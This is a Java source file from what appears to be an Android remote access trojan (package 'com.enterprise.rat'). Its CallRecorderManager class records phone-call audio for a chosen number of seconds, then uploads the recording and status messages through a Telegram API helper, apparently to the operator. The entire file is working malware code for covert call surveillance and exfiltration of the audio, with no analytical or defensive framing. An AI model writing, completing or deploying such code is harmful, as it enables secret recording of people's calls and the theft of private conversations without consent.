package com.enterprise.rat.commands;

import android.content.Context;
import android.media.MediaRecorder;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallRecorderManager {
    private Context context;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;

    public CallRecorderManager(Context context) { this.context = context; }

    public void startCallRecording(int durationSeconds) {
        try {
            String fileName = "CALL_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date()) + ".amr";
            File outputFile = new File(context.getCacheDir(), fileName);
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            new Thread(() -> {
                try {
                    Thread.sleep(durationSeconds * 1000L);
                    stopRecording();
                    TelegramApi.sendFile(outputFile, fileName);
                    TelegramApi.sendMessage("📞 Call recording completed (" + durationSeconds + "s)");
                } catch (Exception e) {
                    TelegramApi.sendMessage("❌ Call recording error: " + e.getMessage());
                }
            }).start();
            TelegramApi.sendMessage("📞 Recording call for " + durationSeconds + " seconds...");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Call recording start error: " + e.getMessage());
        }
    }

    private void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try { mediaRecorder.stop(); mediaRecorder.release(); } catch (Exception e) {}
            mediaRecorder = null;
            isRecording = false;
        }
    }
}
